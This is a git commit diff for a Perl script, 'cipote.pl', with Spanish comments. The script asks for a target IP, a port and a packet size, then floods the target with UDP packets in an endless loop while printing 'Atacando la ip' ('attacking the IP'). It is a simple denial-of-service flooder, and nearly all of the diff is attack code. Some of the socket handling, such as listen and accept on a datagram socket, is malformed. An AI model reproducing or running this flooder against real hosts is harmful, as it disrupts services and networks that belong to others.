1f2a3160f9afc69089b36669605e72cbb46a9fc3
CipoteMan <31932445+CipoteMan@users.noreply.github.com>
2019-04-13 19:28:29 +0100

    Update cipote.pl

--- cipote.pl
+++ cipote.pl
@@ -2,16 +2,21 @@
 use Socket;
 
 #Creado 100% completamente por CipoteMan
+#Esta script sigue en desarrollo
+#Última actualización: 13/04/19
 use utf8;
 my $tiempo = 0;
 my $protocolo = getprotobyname('tcp');
 my $ip;
 my $puerto;
-
-print "Inserte la ip: ";
+system("cls");
+system("clear");
+print "\nInserte la ip: ";
 $ip = <STDIN>;
 print "Inserte el puerto: ";
 $puerto = <STDIN>;
+print "Inserte los paquetes: ";
+$paquetes = <STDIN>;
 socket(envio,PF_INET, SOCK_DGRAM , 17);
 
 listen(envio, 5);
@@ -23,11 +28,14 @@ while ($conexion = accept(NEW_SOCKET, envio)){
 	close NEW_SOCKET;
 }
 connect(envio, sockaddr_in($puerto, inet_aton($ip)));
-print "Conectado a $ip con el puerto $puerto";
+system("cls");
+system("clear");
+print "Atacando la ip $ip con el puerto $puerto";
 
 for (;;){
-	send(envio, pack("a1000","envio"), 0);
+	send(envio, pack("a$paquetes","envio"), 0);
 }
 exit(0);
 
 #bind(envio, pack_sockaddr_in($puerto, inet_aton($ip))) or die "No se puede conectarse a: $ip";
+
